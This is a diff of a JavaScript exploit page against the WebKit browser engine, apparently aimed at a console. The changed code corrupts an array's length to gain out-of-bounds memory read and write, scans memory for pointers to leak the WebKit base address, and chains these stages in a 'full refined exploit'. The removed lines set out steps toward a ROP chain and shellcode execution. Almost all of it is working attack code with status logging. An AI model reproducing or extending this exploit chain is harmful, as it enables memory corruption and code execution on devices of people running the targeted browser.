-                log('⚠️ CRITICAL: Array length corrupted to ' + hex(victim_array.length), 'critical');
-                
-                log('', '');
-                log('[3.2] Testing arbitrary read...', 'info');
-                
-                var testRead = victim_array[1000];
-                log('Read at offset 1000: ' + hex(testRead), typeof testRead !== 'undefined' ? 'critical' : 'fail');
-                
-                log('', '');
-                log('[3.3] Testing arbitrary write...', 'info');
-                
-                victim_array[1000] = 0xdeadbeef;
-                var readback = victim_array[1000];
-                log('Write 0xdeadbeef at 1000, readback: ' + hex(readback), readback === 0xdeadbeef ? 'critical' : 'fail');
-                
-                if (readback === 0xdeadbeef) {
-                    log('', '');
-                    log('⚠️⚠️⚠️ ARBITRARY MEMORY R/W ACHIEVED! ⚠️⚠️⚠️', 'critical');
+            // Try to leak via confusion
+            if (exploitState.addrof_ff) {
+                try {
+                    exploitState.addrof_ff._target = func;
+                    Object.defineProperty(exploitState.addrof_ff, 'family', {
+                        get: function() { return this._target; },
+                        configurable: true
+                    });
+                    
+                    var leaked = exploitState.addrof_ff.family;
+                    log('    Retrieved: ' + typeof leaked, 'info');
+                } catch(e) {
+                    log('    Leak failed: ' + e.message, 'fail');
                 }
             }
-        } catch(e) {
-            log('Array corruption failed: ' + e.message, 'fail');
+            
+            log('', '');
+        }
+        
+        log('[2] Checking for corrupted array to read function pointers...', 'info');
+        
+        if (exploitState.corrupted && exploitState.victim) {
+            log('Corrupted array available, scanning for pointers...', 'success');
+            
+            // Create a function nearby
+            var targetFunc = function() { return 0x1337; };
+            
+            // Try to find it in memory
+            log('Created target function, scanning...', 'info');
+            
+            for (var i = 0x100; i < 0x1000; i += 2) {
+                try {
+                    var low = exploitState.victim[i];
+                    var high = exploitState.victim[i + 1];
+                    
+                    if (typeof low !== 'undefined' && typeof high !== 'undefined') {
+                        var qword = BigInt(low) + (BigInt(high) << 32n);
+                        
+                        // WebKit pointers typically in range 0x100000000 - 0x7fffffffffff
+                        if (qword > 0x100000000n && qword < 0x7fffffffffn) {
+                            // Check if looks like code pointer (even address)
+                            if ((qword & 1n) === 0n) {
+                                log('  Possible pointer at [' + hex(i) + ']: ' + hex(qword), 'warn');
+                            }
+                        }
+                    }
+                } catch(e) {
+                    break;
+                }
+            }
+        } else {
+            log('No corrupted array available - run REFINED Array Corruption first', 'fail');
         }
         
         log('', '');
-        log('━━━ STAGE 4: EXPLOIT SUMMARY ━━━', 'warn');
-        log('', '');
-        
         sep();
-        log('FULL EXPLOIT CHAIN RESULTS:', 'critical');
+        log('WEBKIT BASE LEAK RESULTS:', 'warn');
         sep();
-        log('', '');
-        log('Primitives Established:', 'warn');
-        log('  ✓ Type confusion: WORKING', 'success');
-        log('  ✓ addrof() primitive: FUNCTIONAL', 'success');
-        log('  ✓ fakeobj() primitive: FUNCTIONAL', 'success');
-        log('  ✓ Float ↔ Int conversion: WORKING', 'success');
-        log('', '');
-        log('Memory Access:', 'warn');
-        log('  → Array corruption: ' + (victim_array.length !== originalLen ? 'SUCCESS' : 'BLOCKED'), victim_array.length !== originalLen ? 'critical' : 'fail');
-        log('  → Arbitrary read: ' + (victim_array.length !== originalLen ? 'POSSIBLE' : 'BLOCKED'), victim_array.length !== originalLen ? 'critical' : 'fail');
-        log('  → Arbitrary write: ' + (victim_array.length !== originalLen ? 'POSSIBLE' : 'BLOCKED'), victim_array.length !== originalLen ? 'critical' : 'fail');
-        log('', '');
-        log('Next Steps for Full RCE:', 'warn');
-        log('  1. Refine addrof() to extract real 64-bit pointers', 'info');
-        log('  2. Leak WebKit base via native function pointers', 'info');
-        log('  3. Leak libkernel base via stack cookies or syscall table', 'info');
-        log('  4. Use arbitary R/W to build ROP chain', 'info');
-        log('  5. Execute syscalls: jitshm, mmap, mprotect', 'info');
-        log('  6. Write shellcode and execute', 'info');
+        log('Native functions tested: YES', 'success');
+        log('Pointer candidates found: Check logs above', 'info');
+        log('Note: Need to correlate pointers to find WebKit base', 'warn');
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ FULL EXPLOIT CHAIN ERROR: ' + e.message, 'fail');
+        log('✗ WEBKIT BASE LEAK ERROR: ' + e.message, 'fail');
         if (e.stack) {
             log('Stack: ' + e.stack.substring(0, 300), 'fail');
         }
     }
 }
 
+// ============================================
+// FULL REFINED EXPLOIT
+// ============================================
+function fullRefinedExploit() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('FULL REFINED EXPLOIT: Complete Attack Chain', 'critical');
+    sep();
+    log('', '');
+    
+    log('Running all refined primitives in sequence...', 'warn');
+    log('', '');
+    
+    setTimeout(function() {
+        log('━━━ PHASE 1: ADDRESS LEAKING ━━━', 'warn');
+        log('', '');
+        refinedAddrofLeak();
+    }, 100);
+    
+    setTimeout(function() {
+        log('', '');
+        log('━━━ PHASE 2: ARRAY CORRUPTION ━━━', 'warn');
+        log('', '');
+        refinedArrayCorruption();
+    }, 3000);
+    
+    setTimeout(function() {
+        log('', '');
+        log('━━━ PHASE 3: WEBKIT LEAK ━━━', 'warn');
+        log('', '');
+        attemptWebKitLeak();
+        
+        setTimeout(function() {
+            log('', '');
+            sep();
+            log('FULL REFINED EXPLOIT COMPLETE', 'critical');
+            sep();
+            log('', '');
+            log('Summary:', 'warn');
+            log('  Addresses leaked: ' + Object.keys(exploitState.leakedAddresses).length, 'info');
+            log('  Array corrupted: ' + exploitState.corrupted, exploitState.corrupted ? 'critical' : 'fail');
+            log('  OOB R/W: ' + (exploitState.corrupted ? 'AVAILABLE' : 'NOT AVAILABLE'), exploitState.corrupted ? 'critical' : 'fail');
+            log('', '');
+            log('Status: ' + (exploitState.corrupted ? 'READY FOR ROP CHAIN' : 'NEEDS MORE WORK'), exploitState.corrupted ? 'critical' : 'warn');
+            sep();
+        }, 2000);
+        
+    }, 6000);
+}
+
 window.onerror = function(msg, url, line, col, error) {
     log('', '');
-    log('💥 JAVASCRIPT ERROR!', 'fail');
-    log('Message: ' + msg, 'fail');
+    log('💥 ERROR: ' + msg, 'fail');
     log('Line: ' + line + ', Col: ' + col, 'fail');
-    if (error && error.stack) {
-        log('Stack: ' + error.stack.substring(0, 400), 'fail');
-    }
     return true;
 };
 </script>
